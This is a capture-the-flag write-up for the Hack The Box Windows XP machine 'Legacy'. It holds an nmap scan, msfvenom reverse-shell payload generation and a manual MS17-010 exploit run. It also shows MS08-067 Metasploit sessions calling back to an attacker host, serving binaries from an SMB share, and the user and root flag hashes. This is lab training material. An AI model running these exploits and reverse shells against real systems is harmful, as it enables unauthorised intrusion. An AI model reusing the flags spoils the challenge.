## Information

| Property     | Value                       |
|--------------|-----------------------------|
| **Name**     | Legacy  |
| **IP Address**|   10.10.10.4     |
| **OS**       |  Windows       |
| **Difficulty**| Easy   |

## Enumeration
### Nmap Scan
```bash
nmap -sC -sV -oN nmap_scan.txt -Pn 
```

```bash
PORT      STATE    SERVICE      REASON      VERSION
135/tcp   open     msrpc        syn-ack     Microsoft Windows RPC
139/tcp   open     netbios-ssn  syn-ack     Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds syn-ack     Microsoft Windows XP microsoft-ds
1455/tcp  filtered esl-lm       no-response
2005/tcp  filtered deslogin     no-response
2100/tcp  filtered amiganetfs   no-response
3001/tcp  filtered nessus       no-response
3971/tcp  filtered lanrevserver no-response
7778/tcp  filtered interwise    no-response
8654/tcp  filtered unknown      no-response
38292/tcp filtered landesk-cba  no-response
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: 5d01h57m38s
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:1d:4a (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   00 50 56 b9 1d 4a 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40600/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 29232/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 50902/udp): CLEAN (Failed to receive data)
|   Check 4 (port 28326/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)


```

## Initial Access


#### Port [445] - [SMB]
#### MS17-010 - Eternal Blue (Metasploit - Fail) 

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run 

[*] Started reverse TCP handler on 192.168.205.223:4444 
[*] 10.10.10.4:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.4:445        - Host is likely VULNERABLE to MS17-010! - Windows 5.1 x86 (32-bit)
[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.4:445 - The target is vulnerable.
[-] 10.10.10.4:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

#### MS17-010 - Manual ([helviojunior](https://github.com/helviojunior) Fork)

The exploitation is achieved after 2 steps, payload generation and payload staging and execution: 

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.14.5_4444.exe
```

Payload staging and execution using a [send_and_execute.py](https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py) script made by helviojuinor: 

```bash 
python2 send_and_execute.py 10.10.10.4 ../venom/rev_10.10.14.5_4444.exe
```

Setting up a listener using two methods, nc and meterpreter handler: 

##### nc 

```bash
nc -nlvp 4444
```

##### MSF - exploit/multi/handler

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Command shell session 1 opened (10.10.14.5:4444 -> 10.10.10.4:1075) at 2023-11-16 16:12:46 +0100

Shell Banner:
Microsoft Windows XP [Version 5.1.2600]
-----  
C:\WINDOWS\system32>

```

#### MS08-067

> This security update resolves a privately reported vulnerability in the Server service. The vulnerability could allow remote code execution if an affected system received a specially crafted RPC request. On Microsoft Windows 2000, Windows XP, and Windows Server 2003 systems, an attacker could exploit this vulnerability without authentication to run arbitrary code.
> https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > run
[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.4:1035) at 2023-11-16 11:56:46 +0100
meterpreter > shell
Process 224 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32> 
```

Running whoami command to get the current user failed.

```
C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

We can deliver our own whoami.exe and execute it. 

```bash 
# Hosting our own whoami.exe from an smb server ~/tools/win_privesc/windows-binaries
sudo python /usr/local/bin/smbserver.py smb .

# Executing it from the share 

C:\WINDOWS\system32>\\10.10.14.5\smb\whoami.exe
\\10.10.14.5\smb\whoami.exe
NT AUTHORITY\SYSTEM

```

### User Access

Running as NT AUTHORITY\SYSTEM gives us the ability to retrieve both flags
#### User Flag

```
e69af0e4f443de7e36876fda4ec7644f
```

## Privilege Escalation

-
#### Root Flag

```powershell
C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  08:18 ��    <DIR>          .
16/03/2017  08:18 ��    <DIR>          ..
16/03/2017  08:18 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.385.569.792 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
C:\Documents and Settings\Administrator\Desktop>
```

## Conclusion


## Additional Notes
- 

## Resources
- 